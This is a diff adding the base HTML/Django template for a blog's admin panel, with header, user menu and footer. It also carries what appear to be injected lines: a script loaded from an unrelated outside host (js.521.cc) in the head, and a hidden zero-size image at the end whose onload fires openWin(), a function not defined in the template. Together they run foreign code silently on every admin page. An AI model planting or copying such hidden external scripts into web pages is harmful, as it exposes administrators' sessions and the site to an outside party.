@@ -1,0 +1,67 @@
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<title>{{blog.title}}</title>
+<link rel="shortcut icon" href="/static/favicon.ico" />
+<link rel="stylesheet" href="/static/admin/submenu.css" type="text/css" media="screen"/>
+<link rel="stylesheet" href="/static/admin/admin.css" type="text/css" media="screen"/>
+<!--
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js "></script>
+-->
+<script type="text/javascript" src="/static/js/jquery-1.2.6.js"></script>
+<script type="text/javascript" src="/static/js/jquery.cookie.js"></script>
+<script type="text/javascript" src="/static/js/jquery.submenu.js"></script>
+<script type="text/javascript">
+var mysubmenu=null;
+$(function(){
+	mysubmenu=$("#logpress_menu").submenu({
+		onesmonly:false,
+		speed:300,
+		expandnum:1,
+		savestatus:false
+	}).expandall();
+})
+</script>
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+
+<body class="lp_admin">
+	<div id="lp_wrap">
+		<div id="lpcontent">
+			<div id="lpheader">
+					<h1>
+						<a href="http://{{site.domain}}" title="查看站点" target="_blank">{{blog.title}} <span>← 查看站点</span></a>
+					</h1>
+					<div id="header-info">
+						<div id="user-info">
+							<p>
+								<a title="edit your profile" href="/admin/profile">{{request.user.username}}</a> |
+								<a title="退出" href="{%url logout%}">退出</a>
+							</p>
+						</div>
+					</div>
+			</div>
+			<div id="lpbody">
+				{% include "admin/menu.html" %}
+				<div id="lpbody-content" style="overflow: hidden;">
+					<div id="screen-meta"></div>
+					{% block content %}{% endblock %}
+					
+					<div class="clear"></div>
+				</div>
+				<div class="clear"></div>
+			</div>
+			<div class="clear"></div>
+		</div>
+	</div>
+	<div id="footer">
+		<p id="footer-left" class="alignleft">
+			<span id="footer-thankyou">
+				<a href="http://www.iyouf.info/">dengmin</a> | copyright 2010
+			</span>
+		</p>
+		<p id="footer-upgrade" class="alignright"></p>
+		<div class="clear"></div>
+	</div>
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
